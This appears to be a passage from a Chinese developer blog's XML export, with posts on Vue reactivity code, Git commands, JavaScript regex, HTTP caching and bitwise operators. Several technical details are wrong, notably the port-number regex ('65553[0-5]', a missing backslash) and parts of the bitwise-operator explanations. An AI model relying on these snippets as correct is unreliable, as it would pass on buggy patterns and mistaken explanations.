不允许在已经创建的实例上动态添加新的根级响应式属性 (root-level reactive property)。然而它可以使用 Vue.set(object, key, value) 方法将响应属性添加到嵌套的对象上。也就是我们需要在Vue原型上添加一个set方法去设置新添加的属性，新属性同样要进行监听和添加订阅者。 123456789101112131415161718192021222324252627282930313233/** * vue的set方法，用于外部新增属性 Vue.$set(target, key, val) * @param &#123;Object&#125; target 数据 * @param &#123;String&#125; key 属性 * @param &#123;*&#125; val 值 */function set(target, key, val) &#123; if (Array.isArray(target)) &#123; target.length = Math.max(target.length, key); target.splice(key, 1, val); return val; &#125; if (target.hasOwnProperty(key)) &#123; target[key] = val; return val &#125; var ob = (target).$Observer; if (!ob) &#123; target[key] = val; return val &#125; // 对新增属性定义监听 ob.defineReactive(target, key, val); ob.dep.notify(); return val;&#125;MyVue.prototype.$set = set; 6.1 给数组对象添加属性把数组看成一个特殊的对象，就很容易理解了，对于unshift、push和splice变异方法是添加了对象的属性的，需要对新加的属性进行监听和添加订阅者。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384var arrKeys = [&quot;push&quot;, &quot;pop&quot;, &quot;shift&quot;, &quot;unshift&quot;, &quot;splice&quot;, &quot;sort&quot;, &quot;reverse&quot;];var extendArr = [];arrKeys.forEach(function(key) &#123; def(extendArr, key, function() &#123; var result, arrProto = Array.prototype, ob = this.$Observer, arr = arrProto.slice.call(arguments), inserted, index; switch (key) &#123; case &quot;push&quot;: inserted = arr; index = this.length; break; case &quot;unshift&quot;: inserted = arr; index = 0; break; case &quot;splice&quot;: inserted = arr.slice(2); index = arr[0]; break; &#125; result = arrProto[key].apply(this, arguments); // 监听新增数组对象属性 if (inserted) &#123; ob.observeArray(inserted); &#125; ob.dep.notify(); return result; &#125;);&#125;);var arrayKeys = Object.getOwnPropertyNames(extendArr);/** * 监听器构造函数 * @param &#123;Object&#125; data 被监听数据 */function Observer(data) &#123; this.dep = new Dep(); if (!data || typeof data !== &quot;object&quot;) &#123; return; &#125; // 在每个object上添加一个observer def(data, &quot;$Observer&quot;, this); // 继承变异方法 if (Array.isArray(data)) &#123; // 把数组变异方法的处理，添加到原型链上 data.__proto__ = extendArr; // 监听数组对象属性 this.observeArray(data); &#125; else &#123; this.data = data; this.walk(data); &#125;&#125;Observer.prototype = &#123; // ... /** * 监听数组 */ observeArray: function(items) &#123; console.log(&quot;items:&quot;, items); for (var i = 0, l = items.length; i &lt; l; i++) &#123; observe(items[i]); &#125; &#125;&#125;;]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[test]]></title>
    <url>%2F2018%2F08%2F30%2Ftest%2F</url>
    <content type="text"><![CDATA[以下来测试一下图床 腾讯文档 石墨文档 本地测试]]></content>
      <tags>
        <tag>test</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git简记]]></title>
    <url>%2F2018%2F08%2F27%2FGit%E7%AE%80%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[0. 前言最近有个项目比较赶，于是决定8个人一个并行完成，单独把项目拿出来用gitea管理，没人分一个模块开发，对应也给分支，效果不过，从中也帮助自己重新温习了一下git的使用，小记一下。 1. 安装和使用 在MAC上，安装homebrew，然后通过homebrew 安装Git。 在MAC上另一种安装方法，从AppStore安装Xcode，Xcode集成了Git，不过默认没有安装，你需要运行Xcode，选择菜单“Xcode”-&gt;“Preferences”，在弹出窗口中找到“Downloads”，选择“Command Line Tools”，点“Install”就可以完成安装了。 在Windows上，下载安装包，默认下一步，安装完成即可。 安装完后自报家门 12$ git config --global user.name &quot;wuwhs&quot;$ git config --global user.email &quot;email@example.com&quot; 创建版本库 初始化一个Git仓库，使用git init命令。添加文件到Git仓库，分两步： 第一步，使用命令git add &lt;file&gt;，注意，可反复多次使用，添加多个文件； 第二步，使用命令git commit，完成。 2. 时光穿梭 如果git status告诉你有文件被修改过，用git diff可以查看修改内容。 HEAD指向的版本就是当前版本，因此，Git允许我们在版本的历史之间穿梭，使用命令git reset --hard commit_id。 穿梭前，用git log可以查看提交历史，以便确定要回退到哪个版本。 要重返未来，用git reflog查看命令历史，以便确定要回到未来的哪个版本，git log --pretty=oneline --abbrev-commit在一行显示缩写提交号。 场景1：当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，用命令git checkout -- file。 当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令git reset HEAD file，就回到了场景1，第二步按场景1操作。 命令git rm用于删除一个文件。如果一个文件已经被提交到版本库，那么你永远不用担心误删，但是要小心，你只能恢复文件到最新版本，你会丢失最近一次提交后你修改的内容。 3. 远程仓库 创建SSH Key。$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot;。 登陆GitHub，打开“Account settings”，“SSH Keys”页面。然后，点“Add SSH Key”，填上任意Title，在Key文本框里粘贴id_rsa.pub文件的内容。 要关联一个远程库，使用命令git remote add origin git@server-name:path/repo-name.git。 关联后，使用命令git push -u origin master第一次推送master分支的所有内容。 此后，每次本地提交后，只要有必要，就可以使用命令git push origin master推送最新修改。 要克隆一个仓库，首先必须知道仓库的地址，然后使用git clone命令克隆。 4. 分支管理 Git鼓励大量使用分支。 查看分支：git branch。 创建分支：git branch &lt;name&gt;。 切换分支：git checkout &lt;name&gt;。 创建+切换到当前分支：git checkout -b &lt;name&gt;。 合并某分支到当前分支：git merge &lt;name&gt;。 删除分支：git branch -d &lt;name&gt;。 当Git无法自动合并分支时，就必须首先剞劂冲突，解决冲突后，再提交，合并完成用git log --graph命令可以看到分支合并图。 合并分支时，加上--no-ff参数就可以用普通模式合并，合并后的历史有分支，能看出来曾经做过合并，而fash-forward合并就看不出来曾经做过合并。 当手头工作没有完成时，先把工作现场git stash一下，然后去修复bug，修复后，再git stash list查看历史stash，一是用git stash apply恢复，但恢复后，stash内容并不删除，你需要用git stash drop来删除；另一种方式是用git stash pop，恢复的同时把stash内容也删了。 查看远程库信息，使用git remote -v。 从本地推送分支，使用git push origin branch-name，如果失败，先用git pull抓取远程的新提交。 再本地创建和远程分支对应的分支，使用git checkout -b branch-name origin/branch-name，本地和远程分支的名称最好一致。 从远程抓取分支，使用git pull，如果有冲突，要先处理冲突。 5. 标签 命令git tag &lt;name&gt;用于新建一个标签，默认为HEAD,也可以指定一个commit id。 git tag -a &lt;tagname&gt; -m &quot;balabala...&quot;可以指定标签信息。 git tag -s &lt;tagname&gt; -m &quot;balabala...&quot;可以用PGP签名标签。 命令git tag可以查看所有标签。 命令git push origin &lt;tagname&gt;可以推送一个本地标签。 命令git push origin --tags可以推送全部未推送过的本地标签。 命令git tag -d &lt;tagname&gt;可以删除一个本地标签。 命令git push origin :refs/tags/&lt;tagname&gt;可以删除一个远程标签。 6. 举个应用栗子 最初在远程创建项目仓库有master和develp分支，参与开发人员先在自己一个文件夹下，调出git Bash，然后输入命令git init，再把仓库git clone下来 12345678910MINGW32 /d/appSoft/wampserver/wamp64/www$ git initInitialized empty Git repository in D:/appSoft/wampserver/wamp64/www/.git/MINGW32 /d/appSoft/wampserver/wamp64/www (master)$ git clone git@github.com:wuwhs/demo.gitCloning into &apos;demo&apos;...Warning: Permanently added the RSA host key for IP address &apos;13.229.188.59&apos; to the list of known hosts.warning: You appear to have cloned an empty repository.Checking connectivity... done. cd demo进入clone下载的目录里，用git branch develop在本地创建一个对应的develop分支 1234567891011121314MINGW32 /d/appSoft/wampserver/wamp64/www (master)$ cd demoMINGW32 /d/appSoft/wampserver/wamp64/www/demo (master)$ git branch* masterMINGW32 /d/appSoft/wampserver/wamp64/www/demo (master)$ git branch developMINGW32 /d/appSoft/wampserver/wamp64/www/demo (master)$ git branch develop* master 再次用git branch查看已经新建了一个develop分支 git checkout develop切换到当前develop分支 123MINGW32 /d/appSoft/wampserver/wamp64/www/demo (master)$ git checkout developSwitched to branch &apos;develop&apos; 用git pull origin develop:develop，即：git pull origin &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;，当本地和远程分支名相同时，可以简写成一个，也就是git pull origin develop，拉取远程develop分支完成，然后开发人员就可以在这个分支上工作了 123456789101112MINGW32 /d/appSoft/wampserver/wamp64/www/demo (develop)$ git pull origin develop:developremote: Counting objects: 3, done.remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0Unpacking objects: 100% (3/3), done.From github.com:wuwhs/demo 7ff2cb0..7ab2842 develop -&gt; develop 7ff2cb0..7ab2842 develop -&gt; origin/developwarning: fetch updated the current branch head.fast-forwarding your working tree fromcommit 7ff2cb0627be357fa15db4e38e1bfe8fc820b8ec.Already up-to-date. 当一天了工作完成，要提交到远程分支，首先要拉取一下别人提交的代码，防止版本冲突 123456789101112MINGW32 /d/appSoft/wampserver/wamp64/www/demo (develop)$ git pullremote: Counting objects: 3, done.remote: Compressing objects: 100% (2/2), done.remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0Unpacking objects: 100% (3/3), done.From github.com:wuwhs/demo f848dc7..d696375 develop -&gt; origin/developUpdating f848dc7..d696375Fast-forward demo.txt | 2 ++ 1 file changed, 2 insertions(+) PS：直接偷懒pull可能会出现没有找到tracking的分支 1234567891011MINGW32 /d/appSoft/wampserver/wamp64/www/demo (develop)$ git pullThere is no tracking information for the current branch.Please specify which branch you want to merge with.See git-pull(1) for details.git pull &lt;remote&gt; &lt;branch&gt;If you wish to set tracking information for this branch you can do so with:git branch --set-upstream-to=origin/&lt;branch&gt; develop 这时候要手动添加一下对应分支依赖git branch --set-upstream-to=origin/&lt;branch&gt; develop 12345678910111213141516 MINGW32 /d/appSoft/wampserver/wamp64/www/demo (develop)$ git branch --set-upstream-to=origin/develop developBranch develop set up to track remote branch develop from origin.MINGW32 /d/appSoft/wampserver/wamp64/www/demo (develop)$ git pullremote: Counting objects: 3, done.remote: Compressing objects: 100% (2/2), done.remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0Unpacking objects: 100% (3/3), done.From github.com:wuwhs/demo f848dc7..d696375 develop -&gt; origin/developUpdating f848dc7..d696375Fast-forward demo.txt | 2 ++ 1 file changed, 2 insertions(+) 将本地分支提交到对应远程分支上，git push origin develop:develop，即：git push origin &lt;远程主机&gt;&lt;本地分支名&gt;:&lt;远程分支名&gt;，如果名称一样可以简写，也就是git push origin develop 12345678910MINGW32 /d/appSoft/wampserver/wamp64/www/demo (develop)$ git push origin develop:developCounting objects: 9, done.Delta compression using up to 4 threads.Compressing objects: 100% (5/5), done.Writing objects: 100% (9/9), 759 bytes | 0 bytes/s, done.Total 9 (delta 1), reused 0 (delta 0)remote: Resolving deltas: 100% (1/1), done.To git@github.com:wuwhs/demo.git d696375..3c00c0c develop -&gt; develop 项目测试OK了，本地分支合并到master分支上，要用到git merge &lt;branch&gt; 12345678910MINGW32 /d/appSoft/wampserver/wamp64/www/demo (develop)$ git checkout masterSwitched to branch &apos;master&apos;MINGW32 /d/appSoft/wampserver/wamp64/www/demo (master)$ git merge developUpdating c4d0377..3c00c0cFast-forward demo.txt | 9 +++++++++ 1 file changed, 9 insertions(+) 常用的操作就以上七步了，当然会有不同情形的应用。 7. 附录：git-cheat-sheet一般而言，常用的就是以上那些命令，有人专门的整理了一份比较全一点的文档git-cheat-sheet，方便查阅。 配置列出当前配置： 1$ git config --list 列出repository配置： 1$ git config --local --list 列出全局配置： 1$ git config --global --list 列出系统配置： 1$ git config --system --list 设置用户名： 1$ git config --global user.name &quot;[firstname lastname]&quot; 设置用户邮箱： 1$ git config --global user.email &quot;[valid-email]&quot; 设置git命令输出为彩色： 1$ git config --global color.ui auto 设置git使用的文本编辑器设： 1$ git config --global core.editor vi 配置文件Repository配置对应的配置文件路径[–local]： 1&lt;repo&gt;/.git/config 用户全局配置对应的配置文件路径[–global]： 1~/.gitconfig 系统配置对应的配置文件路径[–local]： 1/etc/gitconfig 创建复制一个已创建的仓库: 12# 通过 SSH$ git clone ssh://user@domain.com/repo.git 12#通过 HTTP$ git clone http://domain.com/user/repo.git 创建一个新的本地仓库: 1$ git init 本地修改显示工作路径下已修改的文件： 1$ git status 显示与上次提交版本文件的不同： 1$ git diff 把当前所有修改添加到下次提交中： 1$ git add . 把对某个文件的修改添加到下次提交中： 1$ git add -p &lt;file&gt; 提交本地的所有修改： 1$ git commit -a 提交之前已标记的变化： 1$ git commit 附加消息提交： 1$ git commit -m &apos;message here&apos; 提交，并将提交时间设置为之前的某个日期: 1git commit --date=&quot;`date --date=&apos;n day ago&apos;`&quot; -am &quot;Commit Message&quot; 修改上次提交（请勿修改已发布的提交记录!） 1$ git commit --amend 修改上次提交的committer date： 1GIT_COMMITTER_DATE=&quot;date&quot; git commit --amend 修改上次提交的author date： 1git commit --amend --date=&quot;date&quot; 把当前分支中未提交的修改移动到其他分支： 123git stashgit checkout branch2git stash pop 将 stashed changes 应用到当前分支： 1git stash apply 删除最新一次的 stashed changes： 1git stash drop 搜索从当前目录的所有文件中查找文本内容： 1$ git grep &quot;Hello&quot; 在某一版本中搜索文本： 1$ git grep &quot;Hello&quot; v2.5 提交历史从最新提交开始，显示所有的提交记录（显示hash， 作者信息，提交的标题和时间）： 1$ git log 显示所有提交（仅显示提交的hash和message）： 1$ git log --oneline 显示某个用户的所有提交： 1$ git log --author=&quot;username&quot; 显示某个文件的所有修改： 1$ git log -p &lt;file&gt; 仅显示远端分支与远端分支提交记录的差集： 1$ git log --oneline &lt;origin/master&gt;..&lt;remote/master&gt; --left-right 谁，在什么时间，修改了文件的什么内容： 1$ git blame &lt;file&gt; 显示reflog： 1$ git reflog show 删除reflog： 1$ git reflog delete 分支与标签列出所有的分支： 1$ git branch 列出所有的远端分支： 1$ git branch -r 切换分支： 1$ git checkout &lt;branch&gt; 创建并切换到新分支: 1$ git checkout -b &lt;branch&gt; 基于当前分支创建新分支： 1$ git branch &lt;new-branch&gt; 基于远程分支创建新的可追溯的分支： 1$ git branch --track &lt;new-branch&gt; &lt;remote-branch&gt; 删除本地分支: 1$ git branch -d &lt;branch&gt; 强制删除一个本地分支：将会丢失未合并的修改！ 1$ git branch -D &lt;branch&gt; 给当前版本打标签： 1$ git tag &lt;tag-name&gt; 给当前版本打标签并附加消息： 1$ git tag -a &lt;tag-name&gt; 更新与发布列出当前配置的远程端： 1$ git remote -v 显示远程端的信息： 1$ git remote show &lt;remote&gt; 添加新的远程端： 1$ git remote add &lt;remote&gt; &lt;url&gt; 下载远程端版本，但不合并到HEAD中： 1$ git fetch &lt;remote&gt; 下载远程端版本，并自动与HEAD版本合并： 1$ git remote pull &lt;remote&gt; &lt;url&gt; 将远程端版本合并到本地版本中： 1$ git pull origin master 以rebase方式将远端分支与本地合并： 1git pull --rebase &lt;remote&gt; &lt;branch&gt; 将本地版本发布到远程端： 1$ git push remote &lt;remote&gt; &lt;branch&gt; 删除远程端分支： 123$ git push &lt;remote&gt; :&lt;branch&gt; (since Git v1.5.0)# orgit push &lt;remote&gt; --delete &lt;branch&gt; (since Git v1.7.0) 发布标签: 1$ git push --tags 合并与重置(Rebase)将分支合并到当前HEAD中： 1$ git merge &lt;branch&gt; 将当前HEAD版本重置到分支中:请勿重置已发布的提交! 1$ git rebase &lt;branch&gt; 退出重置: 1$ git rebase --abort 解决冲突后继续重置： 1$ git rebase --continue 使用配置好的merge tool 解决冲突： 1$ git mergetool 在编辑器中手动解决冲突后，标记文件为已解决冲突： 12$ git add &lt;resolved-file&gt;$ git rm &lt;resolved-file&gt; 合并提交： 1$ git rebase -i &lt;commit-just-before-first&gt; 把上面的内容替换为下面的内容： 原内容： 123pick &lt;commit_id&gt;pick &lt;commit_id2&gt;pick &lt;commit_id3&gt; 替换为： 123pick &lt;commit_id&gt;squash &lt;commit_id2&gt;squash &lt;commit_id3&gt; 撤销放弃工作目录下的所有修改： 1$ git reset --hard HEAD 移除缓存区的所有文件（i.e. 撤销上次git add）: 1$ git reset HEAD 放弃某个文件的所有本地修改： 1$ git checkout HEAD &lt;file&gt; 重置一个提交（通过创建一个截然不同的新提交） 1$ git revert &lt;commit&gt; 将HEAD重置到指定的版本，并抛弃该版本之后的所有修改： 1$ git reset --hard &lt;commit&gt; 用远端分支强制覆盖本地分支： 1git reset --hard &lt;remote/branch&gt; e.g., upstream/master, origin/my-feature 将HEAD重置到上一次提交的版本，并将之后的修改标记为未添加到缓存区的修改： 1$ git reset &lt;commit&gt; 将HEAD重置到上一次提交的版本，并保留未提交的本地修改： 1$ git reset --keep &lt;commit&gt; 删除添加.gitignore文件前错误提交的文件： 123$ git rm -r --cached .$ git add .$ git commit -m &quot;remove xyz file&quot; 完~ 可参考文章： git-guide 廖雪峰git教程 git-scm Git Cheat Sheet 中文版]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式]]></title>
    <url>%2F2018%2F08%2F27%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[对字符串的处理，一般分为字符串操作和正则操作。 字符串操作 str.search(regStr) 返回regStr在str中第一个出现的位置 str.replace(regStr,newStr) 返回替换在str中regStr后字符串 str.substring(n1,n2) 返回str从n1位置到n2位置前一个字符串 str.chartAt(n) 返回n位置字符 str.split(regStr) 返回以regStr隔开的数组 str.match(reg) 返回在str中符合正则reg的字符串数组 正则操作var reg=new RegExp(regStr,’i’); //创建正则对象 var reg=/regStr/i; //隐式创建正则对象 reg.test(str) str是否包含reg返回true/false reg.exec(str) 返回匹配到的字符串和最后一次的匹配字符串最后位置的下一个索引 基础用法 /a|b/ a或b /[abc]/ a或b或c /[a-zA-Z0-9]/ 所有数字和字母 /[^a-zA-Z0-9]/ 除了数字和字母 /.+/ 任意字符 /\d/ 等价于/[0-9]/ 数字 /\w/ 等价于/[a-z0-9_]/ 数字、字母和下划线 /\s/ 等价于/“ “/ 空格 /\D/ 等价于/[^0-9]/ 非数字 /\W/ 等价于/[^a-z0-9_]/ 除了数字、字母和划线 /\S/ 等价于/[^” “]/ 除了空格 /\d{n,m}/ 数字最少出现n次，最多出现m次 /\d{1,}/ 等价于/\d+/ 数字最少出现1次 /\d{0,}/ 等价于/\d*/ 数字最少出现0次 /\d{0,1}/ 等价于/\d?/ 数字最多出现1次 /^\d$/ 以数字开头且以数字结尾 /[\u4e00-\u9fa5]/ 汉字匹配范围 \b 单词边界 \B 非单词边界 ?=n 匹配任何其后紧接指定字符串n的字符串 ?!n 匹配任何其后没有紧接指定字符串n的字符串 疑难点在个人接触正则过程中遇到的一些不易理解的地方 用圆括号将所有选择项括起来，相邻的选择项之间用|分隔。但用圆括号会有一个副作用，是相关的匹配会被缓存，此时可用?:放在第一个选项前来消除这种副作用。其中?:是非捕获元之一，还有两个非捕获元是?=和?!，这两个还有更多的含义，前者为正向预查，在任何开始匹配圆括号内的正则表达式模式的位置来匹配搜索字符串，后者为负向预查，在任何开始不匹配该正则表达式模式的位置来匹配搜索字符串。 表达式 描述 (?:pattern) 匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 (\ ) 来组合一个模式的各个部分是很有用。例如， ‘industr(?:y\ ies) 就是一个比 ‘industry\ industries’ 更简略的表达式。 (?=pattern 正向预查，在任何匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，’Windows (?=95\ 98\ NT\ 2000)’ 能匹配 “Windows 2000” 中的 “Windows” ，但不能匹配 “Windows 3.1” 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。 (?!pattern) 负向预查，在任何不匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如’Windows (?!95\ 98\ NT\ 2000)’ 能匹配 “Windows 3.1” 中的 “Windows”，但不能匹配 “Windows 2000” 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。 一直对正则中的match和exec不易分清，下面来做一下比较。 1. matchmatch方法属于String正则表达方法 语法:1str.match(regexp) str：要进行匹配的字符串 regexp：一个正则表达式(或者由RegExp()构造成的正则表达式) match的用法主要区分就是正则表达式是否有全局标示g 如果有g全局标志，那么返回的数组保存的是，所有匹配的内容。 如果没有g全局标志，那么返回的数组arr.arr[0]保存的是完整的匹配.arr[1]保存的是第一个括号里捕获的字串，依此类推arr[n]保存的是第n个括号捕获的内容。 2. exec与match方法不同exec属于正则表达式的方法 语法：1var result1 = regexp.exec(str); regexp：正则表达式 str：要匹配的字串 exec与match的关联就是exec（g有没有都无影响）就等价于不含有g全局标志的match，即返回数组arr[0]为匹配的完整串，其余的为括号里捕获的字符串。 但如果有g对exec本身的影响是，当一个具有g的正则表达式调用exec()时，他将该对象的lastIndex设置到紧接这匹配子串的字符位置。当第二次调用exec时将从lastIndex所指示的字符位置开始检索，利用这个特点可以反复调用exec遍历所有匹配，等价于match具有g标志。 1234var arrmatch = str.match(reg);for(var i =0; i &lt; arrmatch.length; i++)&#123; document.write(arrmatch[i] +&quot;----&gt;&quot;);&#125; 可见上面的exec和match是等价的. reg.exec(str) 返回匹配到的字符串和最后一次的匹配字符串最后位置的下一个索引如： 1234567891011121314var str = &quot;abc123bef345olj89,ed&quot;;var reg = /\d+/g;console.log(reg.exec(str));console.log(reg.lastIndex);console.log(reg.exec(str));console.log(reg.lastIndex);console.log(reg.exec(str));console.log(reg.lastIndex);console.log(reg.exec(str));console.log(reg.lastIndex); 结果 总结 主要区分match具有g和没有g的区别，没有g的时候与exec是等价的。 而exec返回的串类型不受g影响，但具有g时候会驱动lastIndex可以模拟遍历所有匹配，可以与match具有g的时候等价。 顺便加强理解 ip正则表达式格式由”.”分割成四段，每一段范围是0-255，拿出其中一段进行分析 范围 表达式 0-9 \d 10-99 [1-9]\d 100-199 1\d{2} 200-249 2[0-4]\d 250-255 25[0-5] 所以，其中一段构成的正则表达式是1\d|[1-9]\d|1\d&#123;2&#125;|2[0-4]\d|25[0-5] ，整个ip正则为 1/^(\d|[1-9]\d|1\d&#123;2&#125;|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d&#123;2&#125;|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d&#123;2&#125;|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d&#123;2&#125;|2[0-4]\d|25[0-5])$/ 同理端口号范围是0-65535 范围 表达式 0-9 \d 10-99 [1-9]\d 100-999 [1-9]\d{2} 1000-9999 [1-9]\d{3} 10000-59999 [1-5]\d{4} 60000-64999 6[0-4]\d{3} 65000-65499 65[0-4]\d{2} 65500-65529 655[0-2]\d 65530-65535 65553[0-5] 所以，整个端口号正则为 1/\d|[1-9]\d&#123;1,3&#125;|[1-5]d&#123;4&#125;|6[0-4]\d&#123;3&#125;|65[0-4]\d&#123;2&#125;|655[0-2]\d|65553[0-5]/]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript 正则</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP缓存机制]]></title>
    <url>%2F2018%2F08%2F27%2FHTTP%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[只关注前端方面缓存机制的，可能只清楚在HTML页meta标签处理 1&lt;meta http-equiv=&quot;Pragma&quot; content=&quot;no-store&quot;&gt; 目的是为了不让浏览器缓存当前页面。但是代理服务器不解析HTML内容。这样一般在服务器端对HTTP请求头进行处理控制缓存。 HTTP头控制缓存 大致分为两种：强缓存和协商缓存。强缓存如果命中缓存不需要和服务器发生交互，而协商缓存不管是否命中都要和服务器端进行交互，强制缓存的优先级高于协商缓存。 匹配流程示意图： ==敲黑板：强缓存根据Expire或Cache-Control判断，协商缓存根据Last-Modified或ETag判断，强缓存优先级大于协商缓存== 强缓存 可以理解为无需验证缓存策略。 ExpiresExpires指缓存过期时间，超过时间点就代表资源过期。 Cache-ControlCache-Control可以由多个字段组成，有一下取值： max-age 指定一个时间长度，单位s。在没有禁用缓存并且没有超过有效时间，再次访问这个资源会命中缓存，不会向服务器请求资源而是直接从浏览器中取。 s-maxage 同max-age，覆盖max-age、Expires，仅适用共享缓存，在私有缓存中被忽略。 public 表明响应可以被任何对象（发送请求和客户端、代理服务器）缓存。 private 表明响应只能被单个用户（可能是操作系统用户、浏览器用户）缓存，是非共享的，不能被代理服务器缓存。 no-chache 强制所有缓存了该响应的用户，在使用已缓存的数据前，发送待验证器请求到服务器。==不是字面意思上的不缓存==。 no-store 禁止缓存，每次请求都要向服务器重新获取数据。 协商缓存 缓存的资源到期了，并不意味着资源内容发生了改变，如果和服务器上的资源没有差别，实际上没有必要再次请求。客户端和服务器通过某种验证机制验证当前请求资源是否可以使用缓存。 Last-modified/If-Modified-SinceLast-modified表示服务器端资源的最后修改时间，响应头部会带上这个标识。第一次请求之后，浏览器记录这个时间，再次请求时，请求头带上If-Modified-Since即为之前记录下的时间。服务器端收到带If-Modified-Since的请求后会去和资源最后修改时间对比。若修改过就返回最新资源，状态码200，否则没有修改过返回304。 ==注意：如果响应头中有Last-modified而没有Expire或Chache-Control，浏览器会有自己的算法算出，不同浏览器算出时间不一样，所有Last-modified要配合Expires/Cache-Control使用== Etag/If-None-Match由服务器端上生成一段hash字符串，第一次请求时响应头带上ETag:abcd，之后的请求中带上If-None-Match: abcd，服务器检查ETag，返回304或200 选择Chech-Control策略]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>http</tag>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js中的位运算]]></title>
    <url>%2F2018%2F08%2F27%2Fjs%E4%B8%AD%E7%9A%84%E4%BD%8D%E8%BF%90%E7%AE%97%2F</url>
    <content type="text"><![CDATA[前言在平常的工作中位运算用得比较少，一般用其他更容易理解得方式去达到相同目的。在计算机内部，一切运算最终都转化成二级制元算，直接使用二级制运算执行得效率是最高的。偶尔看到一道面试题，复习一下这方面知识，先来看一下这道面试题： 123var a = 10;a ^= (1&lt;&lt;4) - 1;a的值 题目先放一放，看看js中有哪些位运算。 1. 位与(&amp;)真真为真，其余为假 1234569和10二进制位与运算 1001 &amp; 1010 ------- 1000 由于奇数的二进制末位为1，偶数为0，跟1的位与运算后，分别为1和0，因此可以用位与运算来判断奇偶数。 12345if(n &amp; 1) &#123; console.log('n为奇数');&#125; else &#123; console.log('n为偶数');&#125; 2. 位或(|)假假为假，其余为真 1234569和10二进制位或运算 1001 | 1010 ------- 1011 整数与0的位或运算，都是本身。浮点数不支持位运算，过程中会自动转化成整数，利用这一点，可以将浮点数与0进行位或运算即可达到取整目的。 1console.log(15.22 | 0); // 15 3. 位非(~)真为假，假为真 1234567899二进制位非运算 ~ 0000000000000000 0000000000001001 -------取反 1111111111111111 1111111111110110 -------符号位不变，其余取反 1000000000000000 0000000000001001 -------加1 1000000000000000 0000000000001010 按位非操作，首先每一位取反，然后，第一位为负数符号位保持不变，剩余取反加1就是最后结果。 4. 异或(^)相同为假，不同为真 1234569和10二进制异或运算 1001 | 1010 ------- 0011 可以用于交换两个整数的值，不过一般很少这么用 123456var a = 3, b = 5;a ^= b;b ^= a;a ^= b;console.log('a:', a); // 5console.log('b:', b); // a 5. 有符号左移(&lt;&lt;)首位符号为不动，把32位二进制数字整体往左边移动指定位数，左边超出部分被舍去，右边补0。 123459二进制有符号左移5位 9&lt;&lt;5 0000000000000000 0000000000001001 ------ 0000000000000000 0000000100100000 计算机内是这样位移计算的，实际应用计算我们可以通过公式：num * (2^n)，即：9*Math.pow(2,5) 6. 有符号右移(&gt;&gt;)首位符号为不动，把32位二进制数字整体往右边移动指定位数，右边超出部分被舍去，左边补0。 12345288二进制有符号右移5位 9&gt;&gt;5 0000000000000000 0000000100100000 ------ 0000000000000000 0000000000001001 计算机内是这样位移计算的，实际应用计算我们可以通过公式：num / (2^n)，即：288/Math.pow(2,5) 7. 无符号右移(&gt;&gt;&gt;)符号为也跟着一起移动，这样，无符号右移会把负数的二进制当成整数的二进制码 123454294967296二进制无有符号右移5位 4294967296&gt;&gt;&gt;5 1000000000000000 0000000000000000 ------ 0000010000000000 0000000000000000 回归面试题12var a = 10;a ^= (1&lt;&lt;4) - 1; 1&lt;&lt;4左移4位，即1*Math.pow(2, 4) == 16，则a ^= 15 1234510和15的异或运算 1111 ^ 1010 ......... 0101 0101二进制表示5，所以a的值位5]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js数据类型转化]]></title>
    <url>%2F2018%2F08%2F27%2Fjs%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E5%8C%96%2F</url>
    <content type="text"><![CDATA[数据类型转化表首先上数据类型转化表，便于遇到问题直接查看 值 字符串 数字 布尔值 对象 undefined null “undefined” “null” NaN false false throws TypeError throws TypeError true false “true” “false” 1 0 new Boolean(true) new Boolean(false) “”(空字符串) “1.2”(非空，数字) “one”（非空，非数字） 0 1.2 NaN false true true new String(“”) new String(“1.2”) new String(“one”) 0 -0 NaN Infinity -Infinity 1（非零） “0” “0” “NaN” “Infinity” “-Infinity” “1” new Number(0) new Number(-0) new Number(NaN) new Number(Infinity) new Number(-Infinity) new Number(1) {}（任意对象） [] [9] [“a”] {}.toString() -&gt; {}.valueOf() “” “9” 使用join() {}.valueOf() -&gt; {}.toString() 0 9 NaN NaN true true true true 显式转换显示转换最简单的是使用Boolean()、Number()、String()或Object()构造函数 